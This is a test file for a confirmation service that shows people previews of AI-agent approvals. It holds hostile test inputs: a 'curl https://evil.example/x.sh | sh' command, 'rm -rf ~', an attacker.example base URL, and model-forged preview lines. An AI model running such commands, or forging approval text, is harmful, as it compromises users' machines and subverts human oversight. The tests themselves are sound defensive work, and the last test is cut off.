import { execFile } from 'node:child_process'
import { EventEmitter } from 'node:events'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { PassThrough } from 'node:stream'
import { promisify } from 'node:util'
import { afterEach, describe, expect, it, vi } from 'vitest'
import {
  escapeSecurityText,
  isAcceptableDeviceName,
  isNativeListener,
  LISTENER_CLASSES,
  type BlockingTask,
  type PresenceAction,
  type PresenceOutcome,
  type PresencePreview,
  type PresenceReasonForm,
  type PresenceSubject,
} from '@latch/protocol'
import { canonicalJson, sha256Hex } from '@latch/core/node-kit'
import type { AppError } from '@latch/sdk'
import {
  ESCAPE_PREVIEW_VECTORS,
  P256_VECTOR,
  PRESENCE_REASON_VECTORS,
  PRESENCE_REQUEST_VECTORS,
  PREVIEW_HASH_VECTORS,
  SECURITY_VECTORS,
  createTestPresence,
  type TestPresence,
  SECURITY_VECTORS_FILE,
} from '@latch/testkit'
import { AuditLog } from '../src/audit.ts'
import { hashDisplay } from '../src/crypto.ts'
import { PolicyStore, defaultPolicy, type Policy } from '../src/policy.ts'
import {
  CONFIRMATION_LIFETIME_MS,
  PRESENCE_ACTIONS,
  PresenceService,
  REASON_FORMS,
  buildPreview,
  argumentsText,
  createPresenceBackend,
  enrollmentSubject,
  envNamesText,
  escapePreviewText,
  paramsHash,
  policySubject,
  presenceReason,
  programText,
  reasonSlots,
  toolInputText,
  type ChildProcessLike,
  type ExecFileLike,
  type PresenceBackend,
  type SpawnLike,
} from '../src/presence.ts'

const cleanups: Array<() => Promise<void> | void> = []
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup()
})

function temp(): string {
  const path = mkdtempSync(join(tmpdir(), 'latch-presence-'))
  cleanups.push(() => rmSync(path, { recursive: true, force: true }))
  return path
}

async function auditLog(dataDir = temp()): Promise<{ audit: AuditLog; dataDir: string }> {
  const audit = await AuditLog.open(join(dataDir, 'audit'))
  cleanups.push(() => audit.close())
  return { audit, dataDir }
}

function auditActions(dataDir: string): Array<{ action: string; detail: Record<string, unknown> }> {
  const path = join(dataDir, 'audit', 'audit.jsonl')
  if (!existsSync(path)) return []
  return readFileSync(path, 'utf8')
    .trimEnd()
    .split('\n')
    .filter(Boolean)
    .map(line => JSON.parse(line))
}

const hostId = P256_VECTOR.hostId
const deviceId = `dev_${'C'.repeat(22)}`
const requester = { deviceId, deviceName: '桌面', listener: 'unix' as const, remoteAddress: '本机 host.sock' }
const FORM_NAMES = Object.keys(REASON_FORMS) as PresenceReasonForm[]
const actionsOf = (form: PresenceReasonForm): readonly PresenceAction[] => REASON_FORMS[form].actions
/**
 * A subject of the first form for `action`, every slot filled with `x`. Nothing names `provider.set-key` any more; its
 * placeholder only reaches checks that refuse before any sentence is built.
 */
function subjectFor(action: PresenceAction): PresenceSubject {
  const form = FORM_NAMES.find(name => actionsOf(name).includes(action)) ?? 'origin.confirm'
  return { form, slots: Object.fromEntries(reasonSlots(form).map(name => [name, 'x'])) }
}
/** The title a preview for `action` gets, with an optional `host:port` it adds. */
const title = (action: PresenceAction, target?: string) =>
  buildPreview({
    hostId,
    action,
    now: 0,
    requester,
    subject: subjectFor(action),
    lines: [],
    warnings: [],
    ...(target === undefined ? {} : { target }),
  }).preview.title

async function service(backend: PresenceBackend, options: { now?: () => number; blocking?: () => Promise<BlockingTask[]> } = {}) {
  const { audit, dataDir } = await auditLog()
  const presence = new PresenceService({
    backend,
    hostId,
    audit,
    now: options.now,
    blockingTasks: options.blocking ?? (async () => []),
  })
  return { presence, dataDir }
}

function request(action: PresenceAction = 'approval.r2', params: Record<string, unknown> = { approvalId: 'a-1' }, who = requester) {
  return {
    action,
    requester: who,
    subject: subjectFor(action),
    lines: [{ label: '工具', value: 'write_file' }],
    warnings: [],
    paramsHash: paramsHash(action, params),
  }
}

describe('preview text and hashing', () => {
  it('escapes invisible and bidi characters as in the shared vectors', () => {
    for (const vector of ESCAPE_PREVIEW_VECTORS) expect(escapePreviewText(vector.input)).toBe(vector.output)
    expect(escapePreviewText('a\u202Eb\u200Bc\n\u0085')).toBe('a\\u{202E}b\\u{200B}c\\u{000A}\\u{0085}')
    for (const vector of ESCAPE_PREVIEW_VECTORS) expect(escapePreviewText(vector.output)).toBe(vector.output)
  })

  it('leaves emoji joiners and presentation selectors alone only inside an emoji', () => {
    expect(escapePreviewText).toBe(escapeSecurityText)
    const kept = [
      '\u2764\uFE0F',
      '\u{1F468}\u200D\u{1F4BB}',
      '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}',
      '1\uFE0F\u20E3',
      '*\uFE0E\u20E3',
      '\u263A\uFE0E',
    ]
    for (const text of kept) expect(escapeSecurityText(text)).toBe(text)
    // A joiner counts only directly between two pictographs, not after a selector or a skin tone.
    expect(escapeSecurityText('\u{1F469}\u200D\u2764\uFE0F\u200D\u{1F468}')).toBe('\u{1F469}\u200D\u2764\uFE0F\\u{200D}\u{1F468}')
    expect(escapeSecurityText('\u{1F469}\u{1F3FD}\u200D\u{1F4BB}')).toBe('\u{1F469}\u{1F3FD}\\u{200D}\u{1F4BB}')
    expect(escapeSecurityText('\u200D\u{1F4BB}')).toBe('\\u{200D}\u{1F4BB}')
    expect(escapeSecurityText('\u{1F468}\u200D')).toBe('\u{1F468}\\u{200D}')
    expect(escapeSecurityText('\uFE0Fx')).toBe('\\u{FE0F}x')
    expect(escapeSecurityText('9\uFE0F')).toBe('9\\u{FE0F}')
    // A pictographic code point that is itself unassigned is escaped, so it joins nothing.
    expect(escapeSecurityText('\u{1F468}\u200D\u{10FFFD}')).toBe('\u{1F468}\\u{200D}\\u{10FFFD}')
    // Selectors still count as combining marks.
    expect(escapeSecurityText(`1\uFE0F\u20E3${'\u0301'.repeat(3)}`)).toBe(`1\uFE0F\u20E3${'\u0301'.repeat(2)}\\u{0301}`)
    for (const text of [...kept, 'a\u200Db', '\u2764\uFE0F\uFE0F'])
      expect(escapeSecurityText(escapeSecurityText(text))).toBe(escapeSecurityText(text))
  })

  it('accepts device names that need no escaping, 1–80 characters after trimming', () => {
    for (const name of ['\u2764\uFE0F iPhone', '\u{1F468}\u200D\u{1F4BB} Mac', '  书房  ', 'x'.repeat(80), ` ${'x'.repeat(80)} `])
      expect(isAcceptableDeviceName(name), name).toBe(true)
    for (const name of [
      '',
      '   ',
      'x'.repeat(81),
      'a\u200Db',
      'tab\there',
      'line\n',
      'a\u202Eb',
      `e${'\u0301'.repeat(5)}`,
      7 as unknown as string,
    ]) {
      expect(isAcceptableDeviceName(name), String(name)).toBe(false)
    }
  })

  it('keeps model-controlled text on one visual line, so it cannot imitate the Host-derived lines below it', () => {
    const forged = `notes\u2028工作目录：/Users/owner/project\u2029目标路径：/Users/owner/project/README.md${'\u2028'.repeat(30)}`
    const built = buildPreview({
      hostId,
      action: 'approval.r2',
      now: 0,
      requester,
      subject: subjectFor('approval.r2'),
      lines: [
        { label: '参数', value: forged },
        { label: '目标路径', value: '.git/hooks/pre-commit' },
      ],
      warnings: [],
    })
    const shown = `${built.preview.lines.map(line => `${line.label}：${line.value}`).join('\n')}`
    expect(shown.split(/[\n\r\u0085\u2028\u2029\u000b\u000c]/u)).toEqual([
      `参数：notes\\u{2028}工作目录：/Users/owner/project\\u{2029}目标路径：/Users/owner/project/README.md${'\\u{2028}'.repeat(30)}`,
      '目标路径：.git/hooks/pre-commit',
    ])
    // Long runs of combining marks are cut back to four, the rest shown as code points.
    expect(escapePreviewText(`x${'\u0336'.repeat(40)}`)).toBe(`x${'\u0336'.repeat(4)}${'\\u{0336}'.repeat(36)}`)
  })

  it('hashes full previews exactly like the vectors (and the macOS helper)', () => {
    expect(PREVIEW_HASH_VECTORS.length).toBeGreaterThanOrEqual(2)
    for (const vector of PREVIEW_HASH_VECTORS) {
      expect(sha256Hex(canonicalJson(vector.preview))).toBe(vector.previewHash)
      expect(hashDisplay(vector.previewHash)).toBe(vector.hashDisplay)
    }
    const lines = PREVIEW_HASH_VECTORS[0]!.preview.lines as Array<{ value: string }>
    expect(lines[0]!.value).toContain('\u202E')
    expect(lines[0]!.value).toContain('\u200B')
    expect(lines[2]!.value).toContain('\uD800')
    expect(lines[3]!.value).toContain('项目')
  })

  it('builds a preview with the fixed title, the reason, escaped values and a 120 s expiry', () => {
    const now = Date.UTC(2026, 9, 23, 10)
    const built = buildPreview({
      hostId,
      action: 'device.enroll',
      now,
      requester: { deviceName: '手机\u202E', listener: 'lan-tls', remoteAddress: '192.0.2.8' },
      subject: enrollmentSubject('lan-tls', '手机\u202E'),
      lines: [{ label: '设备名称', value: '手机\u202Eevil\n' }],
      warnings: ['只有在你正在连接这台设备时才允许。'],
    })
    expect(built.preview).toEqual({
      v: 2,
      hostId,
      action: 'device.enroll',
      title: '允许新设备连接',
      reason: '允许「手机\\u{202E}」连接这台 Mac',
      subject: { form: 'device.enroll-named', slots: { device: '手机\\u{202E}' } },
      requester: { deviceName: '手机\\u{202E}', listener: 'lan-tls', remoteAddress: '192.0.2.8' },
      lines: [{ label: '设备名称', value: '手机\\u{202E}evil\\u{000A}' }],
      warnings: ['只有在你正在连接这台设备时才允许。'],
      nonce: expect.stringMatching(/^[A-Za-z0-9_-]{22}$/u),
      expiresAt: '2026-10-23T10:02:00.000Z',
    })
    expect(built.previewHash).toBe(sha256Hex(canonicalJson(built.preview)))
    expect(built.hashDisplay).toBe(hashDisplay(built.previewHash))
    // Equal input hashes equally; any change to what is shown changes the hash.
    expect(sha256Hex(canonicalJson(structuredClone(built.preview)))).toBe(built.previewHash)
    expect(sha256Hex(canonicalJson({ ...built.preview, lines: [{ label: '设备名称', value: '手机' }] }))).not.toBe(built.previewHash)
    expect(sha256Hex(canonicalJson({ ...built.preview, reason: `${built.preview.reason} ` }))).not.toBe(built.previewHash)
  })

  it('titles a policy change by the one checked address it adds and keeps fixed wording everywhere else', () => {
    expect(title('policy.change', '127.0.0.1:11434')).toBe('允许 Host 访问 127.0.0.1:11434')
    expect(title('policy.change', '[::1]:8080')).toBe('允许 Host 访问 [::1]:8080')
    // Anything that is not a plain `host:port` keeps the fixed title; the rows still carry the whole value, escaped.
    for (const text of ['evil.example', 'http://a:1', 'a:1/x', 'a b:1', 'a\u202E:1', `${'a'.repeat(260)}:1`]) {
      expect(title('policy.change', text), text).toBe('放宽本机安全策略')
    }
    expect(title('provider.confirm-origin', '127.0.0.1:11434')).toBe('确认模型服务地址 127.0.0.1:11434')
    expect(title('provider.confirm-origin', 'api.example.com:443')).toBe('确认模型服务地址 api.example.com:443')
    for (const text of ['http://a:1', 'a b:1', 'a\u202E:1']) expect(title('provider.confirm-origin', text), text).toBe('确认模型服务地址')
    // Names an admin device chose never enter a title.
    for (const action of ['task.mode-widen', 'task.start-l3', 'device.enroll', 'approval.r2'] as const) {
      expect(title(action, '127.0.0.1:11434')).toBe(title(action))
    }
    expect(title('task.start-l3')).toBe('开启完全访问会话')
  })

  it('refuses previews larger than 64 KiB', () => {
    expect(() =>
      buildPreview({
        hostId,
        action: 'approval.r2',
        now: 0,
        requester,
        subject: subjectFor('approval.r2'),
        lines: [{ label: '参数', value: 'x'.repeat(70_000) }],
        warnings: [],
      }),
    ).toThrow(expect.objectContaining({ status: 413, code: 'preview-too-large' }))
  })

  it('binds parameters independent of key order', () => {
    expect(paramsHash('policy.change', { a: 1, b: [2] })).toBe(paramsHash('policy.change', { b: [2], a: 1 }))
    expect(paramsHash('policy.change', { a: 1 })).not.toBe(paramsHash('device.grant', { a: 1 }))
    expect(paramsHash('policy.change', { a: 1 })).toBe(sha256Hex(canonicalJson({ action: 'policy.change', params: { a: 1 } })))
  })

  it('records a result the audit log accepts for every action, the automation grant included', async () => {
    const { audit, dataDir } = await auditLog()
    const actions = Object.keys(PRESENCE_ACTIONS) as PresenceAction[]
    for (const action of actions) {
      await audit.append({
        action: 'presence.result',
        actor: { listener: 'unix', via: 'http' },
        target: `cfm_${'A'.repeat(22)}`,
        detail: { confirmationId: `cfm_${'A'.repeat(22)}`, action, result: 'denied' },
      })
    }
    expect(auditActions(dataDir).map(record => record.detail.action)).toEqual(actions)
  })

  it('requires biometrics for class A actions only', () => {
    expect(
      Object.entries(PRESENCE_ACTIONS)
        .filter(([, value]) => !value.requireBiometric)
        .map(([key]) => key),
    ).toEqual(['provider.set-key', 'approval.r2'])
  })
})

describe('the system sheet reason', () => {
  const invalid = expect.objectContaining({ status: 500, code: 'preview-invalid' })
  const reason = (action: PresenceAction, form: PresenceReasonForm, slots: Record<string, string>) =>
    presenceReason(action, { form, slots })

  it('builds every shared reason vector exactly', () => {
    expect(PRESENCE_REASON_VECTORS.length).toBeGreaterThanOrEqual(40)
    for (const vector of PRESENCE_REASON_VECTORS) {
      expect(presenceReason(vector.action as PresenceAction, vector.subject as PresenceSubject), vector.reason).toBe(vector.reason)
    }
  })

  it("pins every form and action of the helper's table with a vector; only the Host holds the forms of the routes being removed", () => {
    const pinned = new Set(PRESENCE_REASON_VECTORS.map(vector => vector.subject.form))
    expect(FORM_NAMES.filter(form => !pinned.has(form))).toEqual([])
    expect([...pinned].filter(form => !Object.hasOwn(REASON_FORMS, form))).toEqual([])
    for (const form of FORM_NAMES) {
      for (const action of actionsOf(form)) {
        const covered = PRESENCE_REASON_VECTORS.some(vector => vector.subject.form === form && vector.action === action)
        expect(covered, `${form} for ${action}`).toBe(true)
      }
    }
  })

  it('reads as one plain sentence, naming a mode and a project only when there is one and never a confinement', () => {
    expect(reason('approval.r2', 'approval.write', { path: '~/.zshrc' })).toBe('允许写入 ~/.zshrc')
    expect(reason('device.enroll-native', 'device.enroll-native', { device: 'Kristen 的 iPhone' })).toBe(
      '允许「Kristen 的 iPhone」连接这台 Mac',
    )
    expect(reason('device.enroll', 'device.enroll-named', { device: '书房的 iPad' })).toBe('允许「书房的 iPad」连接这台 Mac')
    const start = (form: PresenceReasonForm, slots: Record<string, string>) =>
      reason('task.start-l3', form, { agent: 'Codex', program: '/opt/homebrew/bin/codex-acp', args: '', env: '', ...slots })
    expect(start('start.first', { project: 'latch' })).toBe(
      '允许 Codex 读写这台 Mac 上的文件并运行命令（项目「latch」）：/opt/homebrew/bin/codex-acp',
    )
    expect(start('start.first', { project: '' })).toBe('允许 Codex 读写这台 Mac 上的文件并运行命令：/opt/homebrew/bin/codex-acp')
    expect(start('start.first-mode', { mode: '完全访问', project: 'latch' })).toBe(
      '允许 Codex 以「完全访问」读写这台 Mac 上的文件并运行命令（项目「latch」）：/opt/homebrew/bin/codex-acp',
    )
    expect(start('start.changed', { project: 'latch' })).toBe(
      '再次允许 Codex 读写这台 Mac 上的文件并运行命令（启动方式已变化，项目「latch」）：/opt/homebrew/bin/codex-acp',
    )
    expect(start('start.changed', { project: '' })).toBe(
      '再次允许 Codex 读写这台 Mac 上的文件并运行命令（启动方式已变化）：/opt/homebrew/bin/codex-acp',
    )
    expect(start('start.changed-mode', { mode: '完全访问', project: 'latch' })).toBe(
      '再次允许 Codex 以「完全访问」读写这台 Mac 上的文件并运行命令（启动方式已变化，项目「latch」）：/opt/homebrew/bin/codex-acp',
    )
    expect(reason('task.mode-widen', 'mode.widen', { session: '修复登录', mode: '完全访问' })).toBe('允许「修复登录」改用「完全访问」')
    expect(reason('task.mode-widen', 'mode.widen-draft', { agent: 'Codex', project: 'latch', mode: '完全访问' })).toBe(
      '允许 Codex 改用「完全访问」（项目「latch」）',
    )
    expect(reason('task.mode-widen', 'mode.widen-draft', { agent: 'Codex', project: '', mode: '完全访问' })).toBe(
      '允许 Codex 改用「完全访问」',
    )
    expect(reason('agent.probe', 'agent.probe', { agent: 'Codex' })).toBe('试运行 Codex，不发送内容')
    expect(reason('provider.confirm-origin', 'origin.confirm', { target: '127.0.0.1:11434' })).toBe('允许 Latch 连接 127.0.0.1:11434')
    expect(reason('policy.change', 'policy.remote-start', {})).toBe('允许手机和浏览器在这台 Mac 上开始新会话')
    expect(reason('policy.change', 'policy.relay', { relay: '东京' })).toBe('允许 Latch 使用中继「东京」')
    expect(reason('policy.change', 'policy.feishu', { name: '王小明' })).toBe('允许飞书用户「王小明」使用这台 Mac 上的 Latch')
    expect(reason('automation.grant', 'automation.grant', { name: '每日依赖检查', agent: 'Codex' })).toBe(
      '允许自动化「每日依赖检查」按时用 Codex 读写这台 Mac 上的文件并运行命令',
    )
    expect(reason('plugin.package.apply', 'plugin.package.apply', { plugin: '发布检查' })).toBe('应用插件「发布检查」')
    expect(reason('device.grant', 'device.grant', { device: 'iPad', change: '批准普通操作' })).toBe('为「iPad」增加权限：批准普通操作')
  })

  it('cuts each slot by grapheme clusters, never inside an emoji, and never cuts the fixed wording', () => {
    const device = `${'a'.repeat(18)}\u{1F468}\u200D\u{1F469}\u200D\u{1F467}xyz`
    expect(reason('device.enroll-native', 'device.enroll-native', { device })).toBe(
      `允许「${'a'.repeat(18)}\u{1F468}\u200D\u{1F469}\u200D\u{1F467}…」连接这台 Mac`,
    )
    // A path keeps its end, so the file name stays; so does the domain of a long host name.
    expect(reason('approval.r2', 'approval.write', { path: `${'dir/'.repeat(20)}deck.pptx` })).toBe(
      `允许写入 …${'dir/'.repeat(20).slice(-30)}deck.pptx`,
    )
    expect(reason('policy.change', 'origin.confirm', { target: `${'a'.repeat(70)}.example:443` })).toMatch(
      /^允许 Latch 连接 …a+\.example:443$/u,
    )
    for (const form of FORM_NAMES) {
      const slots = Object.fromEntries(reasonSlots(form).map(name => [name, '长'.repeat(200)]))
      const text = presenceReason(actionsOf(form)[0]!, { form, slots })
      // A changed start that names a mode, a project and its whole command is the longest.
      expect([...text].length, form).toBeLessThanOrEqual(203)
    }
  })

  it('escapes what a device, an agent, an admin or a model chose before cutting it', () => {
    expect(reason('device.enroll', 'device.enroll-named', { device: 'i\u200BPh\n' })).toBe('允许「i\\u{200B}Ph\\u{000A}」连接这台 Mac')
    // Escaped text counts by its visible characters, so a run of controls cannot push the rest out unseen.
    expect(reason('device.enroll', 'device.enroll-named', { device: '\u202E'.repeat(3) })).toBe(
      '允许「\\u{202E}\\u{202E}\\u{…」连接这台 Mac',
    )
    // An agent names its own modes.
    expect(reason('task.mode-widen', 'mode.widen', { session: '整理', mode: '只读\u202E\u2066完全访问' })).toBe(
      '允许「整理」改用「只读\\u{202E}\\u{2066}完全访问」',
    )
    expect(
      reason('task.start-l3', 'start.first-mode', {
        agent: 'Codex\u200B',
        mode: 'auto\u2028',
        project: 'A\u202Ecme',
        program: '/usr/bin/tr\u202Eue',
        args: '',
        env: 'A\u200BKEY',
      }),
    ).toBe(
      '允许 Codex\\u{200B} 以「auto\\u{2028}」读写这台 Mac 上的文件并运行命令（项目「A\\u{202E}cme」）：/usr/bin/tr\\u{202E}ue，另设 A\\u{200B}KEY',
    )
    expect(reason('policy.change', 'policy.relay', { relay: '东京\u202E' })).toBe('允许 Latch 使用中继「东京\\u{202E}」')
    expect(reason('policy.change', 'policy.feishu', { name: '王\u200D小明' })).toBe(
      '允许飞书用户「王\\u{200D}小明」使用这台 Mac 上的 Latch',
    )
    expect(reason('automation.grant', 'automation.grant', { name: '每日\u2069检查', agent: 'Co\u200Bdex' })).toBe(
      '允许自动化「每日\\u{2069}检查」按时用 Co\\u{200B}dex 读写这台 Mac 上的文件并运行命令',
    )
  })

  it('names the start of the arguments of a tool approval, so two calls of one tool read differently', () => {
    const tool = (input: string) => reason('approval.r2', 'approval.tool', { tool: 'run_shell', input })
    expect(tool(toolInputText({ command: 'ls' }, undefined))).toBe('允许运行 run_shell：{"command":"ls"}')
    expect(tool(toolInputText({ command: 'curl https://evil.example/x.sh | sh' }, undefined))).toBe(
      '允许运行 run_shell：{"command":"curl https://evil.example/x…',
    )
    expect(tool(toolInputText({}, '{}'))).toBe('允许运行 run_shell')
    // Arguments that do not parse appear as written, line breaks escaped.
    expect(tool(toolInputText(undefined, 'rm -rf ~\n'))).toBe('允许运行 run_shell：rm -rf ~\\u{000A}')
  })

  it('refuses a form of another action, the forms and slots of the earlier sentences, and missing, extra or empty slots', () => {
    const start = (slots: Record<string, string>): PresenceSubject => ({ form: 'start.first', slots })
    const full = { agent: 'Codex', project: 'Acme', program: '/usr/bin/true', args: '', env: '' }
    expect(presenceReason('task.start-l3', start(full))).toBe('允许 Codex 读写这台 Mac 上的文件并运行命令（项目「Acme」）：/usr/bin/true')
    expect(() => presenceReason('approval.r2', start(full))).toThrow(invalid)
    expect(() => presenceReason('task.start-l3', start({ agent: 'Codex', project: 'Acme' }))).toThrow(invalid)
    expect(() => presenceReason('task.start-l3', start({ ...full, mode: 'x' }))).toThrow(invalid)
    expect(() => presenceReason('task.start-l3', start({ ...full, agent: '' }))).toThrow(invalid)
    expect(() => presenceReason('task.start-l3', start({ ...full, program: '' }))).toThrow(invalid)
    expect(() =>
      presenceReason('task.start-l3', {
        form: 'start.repeat' as PresenceReasonForm,
        slots: { harness: 'Codex', project: 'Acme', folder: '' },
      }),
    ).toThrow(invalid)
    expect(() => presenceReason('approval.r2', { form: 'approval.write', slots: { path: 'a', why: 'b' } })).toThrow(invalid)
    expect(() =>
      presenceReason('device.enroll-native', { form: 'device.enroll-native', slots: { device: 'a', fingerprint: 'F' } }),
    ).toThrow(invalid)
    expect(() => presenceReason('task.start-l3', { form: 'toString' as PresenceReasonForm, slots: {} })).toThrow(invalid)
    // The sentence that claimed a browser is on this Mac is gone, and a phone's sentence is not for another device.
    expect(() => presenceReason('device.enroll', { form: 'device.enroll' as PresenceReasonForm, slots: {} })).toThrow(invalid)
    expect(() => presenceReason('device.enroll', { form: 'device.enroll-native', slots: { device: 'a' } })).toThrow(invalid)
    expect(() =>
      buildPreview({
        hostId,
        action: 'approval.r2',
        now: 0,
        requester,
        subject: start(full),
        lines: [],
        warnings: [],
      }),
    ).toThrow(invalid)
  })

  it('agrees with the helper about which request lines carry the reason their subject produces', () => {
    for (const vector of PRESENCE_REQUEST_VECTORS) {
      const request = vector.request as { v: number; preview: PresencePreview; previewHash: string }
      const hashed = sha256Hex(canonicalJson(request.preview)) === request.previewHash
      const rebuilt = () => presenceReason(request.preview.action, request.preview.subject)
      if (vector.result === 'ok') {
        expect(hashed, vector.name).toBe(true)
        expect(rebuilt(), vector.name).toBe(request.preview.reason)
      } else if (vector.result === 'reason-mismatch') {
        expect(hashed, vector.name).toBe(true)
        expect(rebuilt(), vector.name).not.toBe(request.preview.reason)
      } else if (vector.result === 'preview-invalid' && request.preview.v === 2) {
        expect(rebuilt, vector.name).toThrow(invalid)
      }
    }
  })

  it('names every enrolling device by the name it gave, and never presents a loopback peer as this Mac', () => {
    for (const listener of LISTENER_CLASSES) {
      const action = isNativeListener(listener) ? 'device.enroll-native' : 'device.enroll'
      expect(presenceReason(action, enrollmentSubject(listener, '书房的 iPad')), listener).toBe('允许「书房的 iPad」连接这台 Mac')
    }
    expect(enrollmentSubject('native-relay', 'x').form).toBe('device.enroll-native')
    expect(enrollmentSubject('unix', 'x').form).toBe('device.enroll-named')
  })

  it('names the executable by its path, the arguments and the variables a definition sets, never their values', () => {
    const start = (slots: Record<string, string>) =>
      reason('task.start-l3', 'start.first', {
        agent: 'Codex',
        project: 'Acme',
        program: '/opt/homebrew/bin/codex-acp',
        args: '',
        env: '',
        ...slots,
      })
    const said = '允许 Codex 读写这台 Mac 上的文件并运行命令（项目「Acme」）：'
    expect(start({})).toBe(`${said}/opt/homebrew/bin/codex-acp`)
    expect(start({ env: envNamesText({ OPENAI_BASE_URL: 'https://attacker.example', A_KEY: 'secret-value' }) })).toBe(
      `${said}/opt/homebrew/bin/codex-acp，另设 A_KEY、OPENAI_BASE_URL`,
    )
    expect(start({ env: envNamesText(['A'.repeat(30)]) })).toBe(`${said}/opt/homebrew/bin/codex-acp，另设 ${'A'.repeat(23)}…`)
    // A file of the same name in another folder reads differently: the sentence names its own path.
    const planted = start({ program: programText('/Users/u/proj/node_modules/.bin/codex-acp', '/Users/u') })
    expect(planted).toBe(`${said}~/proj/node_modules/.bin/codex-acp`)
    // Arguments past their length are cut where everyone sees it.
    expect(start({ args: argumentsText(['--model', 'gpt-5', '-c', 'sandbox=danger-full-access']) })).toBe(
      `${said}/opt/homebrew/bin/codex-acp --model gpt-5 -c sandbo…`,
    )
    // A deep path keeps its end: the file name and the folders nearest it.
    expect(start({ program: `/Users/u/${'deep/'.repeat(10)}bin/codex-acp` })).toBe(
      `${said}…${`${'deep/'.repeat(10)}bin/codex-acp`.slice(-51)}`,
    )
  })

  it('writes an executable as its path with home as ~, and arguments quoted unless they are plainly one word', () => {
    expect(programText('/opt/homebrew/bin/codex-acp', '/Users/u')).toBe('/opt/homebrew/bin/codex-acp')
    expect(programText('/Users/u/.local/bin/codex-acp', '/Users/u')).toBe('~/.local/bin/codex-acp')
    // Only the home folder itself, never another one that starts with the same letters.
    expect(programText('/Users/uu/bin/codex-acp', '/Users/u')).toBe('/Users/uu/bin/codex-acp')
    expect(argumentsText([])).toBe('')
    expect(argumentsText(['--flag=a,b', 'two words', '', 'a"b', '项目'])).toBe('--flag=a,b "two words" "" "a\\"b" "项目"')
    expect(envNamesText({ OPENAI_BASE_URL: 'https://attacker.example', A_KEY: 'secret-value' })).toBe('A_KEY、OPENAI_BASE_URL')
  })

  it('names what a policy change raises, one kind of change at a time', () => {
    const base: Policy = {
      ...defaultPolicy('darwin'),
      local: { maxLevel: 'L1', allowL3: false },
      remote: { maxLevel: 'L1', allowRemoteStart: false, harnesses: ['standard'], workspaces: [], allowInstall: false },
    }
    const raise = (edit: (next: Policy) => void) => {
      const next = structuredClone(base)
      edit(next)
      return policySubject(base, next)
    }
    // One new address reads as a model-service address does: Latch may then connect to it.
    const address = raise(next => void (next.hostEgressAllow = ['127.0.0.1:11434']))
    expect(address).toEqual({ form: 'origin.confirm', slots: { target: '127.0.0.1:11434' } })
    expect(presenceReason('policy.change', address)).toBe('允许 Latch 连接 127.0.0.1:11434')
    expect(raise(next => void (next.hostEgressAllow = ['a.example:1', 'b.example:2']))).toEqual({
      form: 'policy.egress-many',
      slots: { count: '2' },
    })
    expect(raise(next => void (next.local = { maxLevel: 'L2', allowL3: true }))).toEqual({
      form: 'policy.local',
      slots: { level: '完全访问' },
    })
    expect(raise(next => void (next.local.maxLevel = 'L2'))).toEqual({ form: 'policy.local', slots: { level: '自动编辑' } })
    expect(raise(next => void (next.remote.maxLevel = 'L2'))).toEqual({ form: 'policy.remote', slots: { level: '自动编辑' } })
    expect(raise(next => void (next.remote.allowRemoteStart = true))).toEqual({ form: 'policy.remote-start', slots: {} })
    expect(raise(next => void (next.remote.harnesses = null))).toEqual({ form: 'policy.remote-agents', slots: {} })
    expect(raise(next => void (next.remote.workspaces = null))).toEqual({ form: 'policy.remote-projects', slots: {} })
    expect(
      raise(next => {
        next.local = { maxLevel: 'L2', allowL3: true }
        next.hostEgressAllow = ['127.0.0.1:11434']
      }),
    ).toEqual({ form: 'policy.several', slots: { count: '3' } })
  })
})

describe('PresenceService', () => {
  it('keeps shell approval pending without calling the OS backend, binds its digest and consumes once as shell-local', async () => {
    const backend = createTestPresence({ mode: 'manual' })
    const { presence } = await service(backend)
    const record = await presence.request({ ...request(), confirmationMethod: 'shell-local' })
    expect(backend.requests).toEqual([])
    expect(record.status).toBe('pending')
    expect(presence.shellPreview(record.id, deviceId)).toMatchObject({
      previewHash: record.previewHash,
      preview: { nonce: expect.any(String), action: 'approval.r2' },
    })
    expect(() => presence.shellPreview(record.id, 'other')).toThrow(expect.objectContaining({ code: 'confirmation-not-found' }))
    await expect(presence.completeShell(record.id, deviceId, '0'.repeat(64), true)).rejects.toMatchObject({ code: 'confirmation-mismatch' })
    await expect(presence.completeShell(record.id, deviceId, record.previewHash, true)).resolves.toMatchObject({
      status: 'approved',
      confirmationMethod: 'shell-local',
    })
    await expect(record.settled).resolves.toMatchObject({ result: 'approved', method: 'shell', previewHash: record.previewHash })
    expect(presence.consume(record.id, { action: record.action, requesterDeviceId: deviceId, paramsHash: record.paramsHash })).toEqual({
      stepup: 'shell-local',
      method: 'shell',
    })
    await expect(presence.completeShell(record.id, deviceId, record.previewHash, true)).rejects.toMatchObject({ code: 'confirmation-used' })
  })

  it('never downgrades enrollment or policy actions, nor remote or anonymous requesters, to a shell sheet', async () => {
    const { presence } = await service(createTestPresence())
    for (const action of ['device.enroll', 'device.grant', 'policy.change', 'provider.confirm-origin', 'agent.probe'] as const)
      await expect(presence.request({ ...request(action), confirmationMethod: 'shell-local' })).rejects.toMatchObject({
        code: 'confirmation-os-required',
      })
    await expect(
      presence.request({ ...request(), requester: { ...requester, listener: 'loopback-tcp' }, confirmationMethod: 'shell-local' }),
    ).rejects.toMatchObject({ code: 'confirmation-os-required' })
    const record = await presence.request(request())
    await record.settled
    expect(() => presence.shellPreview(record.id, deviceId)).toThrow(expect.objectContaining({ code: 'confirmation-os-required' }))
  })

  it('expires and cancels shell sheets without allowing their late approval', async () => {
    let now = 0
    const { presence } = await service(createTestPresence(), { now: () => now })
    const first = await presence.request({ ...request(), confirmationMethod: 'shell-local' })
    now += 120_001
    await expect(presence.completeShell(first.id, deviceId, first.previewHash, true)).rejects.toMatchObject({
      code: 'confirmation-expired',
    })
    await expect(first.settled).resolves.toMatchObject({ result: 'timeout' })
    const second = await presence.request({ ...request(), confirmationMethod: 'shell-local' })
    presence.cancel(second.id, deviceId)
    await expect(second.settled).resolves.toMatchObject({ result: 'cancelled' })
    await expect(presence.completeShell(second.id, deviceId, second.previewHash, true)).rejects.toMatchObject({ code: 'confirmation-used' })
  })

  it('approves once for exactly this binding, then refuses reuse', async () => {
    const backend = createTestPresence({ method: 'password' })
    const { presence } = await service(backend)
    const record = await presence.request(request())
